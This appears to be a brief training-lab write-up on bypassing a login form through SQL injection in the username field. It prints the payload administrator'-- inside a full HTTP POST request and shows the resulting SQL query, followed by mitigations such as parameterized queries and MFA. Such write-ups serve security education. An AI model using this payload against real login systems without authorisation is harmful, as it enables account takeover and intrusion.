
**Lab 2: SQL Injection Vulnerability Allowing Login Bypass**

**Objective:** Exploit a SQL injection vulnerability in the login function to gain administrator access.

**Steps Taken:**
1. Used Burp Suite to intercept and analyze login requests.
2. Identified the `username` parameter as vulnerable.
3. Injected `administrator'--` to bypass authentication:
   ```http
   POST /login HTTP/2
   Content-Type: application/x-www-form-urlencoded
   csrf=ysa4p38HO026w3FfUFWv3Ev5QnMdnNjr&username=administrator%27--&password=lol
   ```
4. Verified successful login as the administrator.

**Key Takeaways:**
- SQL injection can bypass authentication by commenting out the password check.
- Strong input validation and parameterized queries are crucial for security.
- Implementing multi-factor authentication (MFA) can mitigate such attacks.

**Conclusion:** Successfully bypassed login using SQL injection. Next steps include testing for additional SQLi vulnerabilities and applying mitigation techniques in real-world scenarios.
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password=''
```
Handily crafted 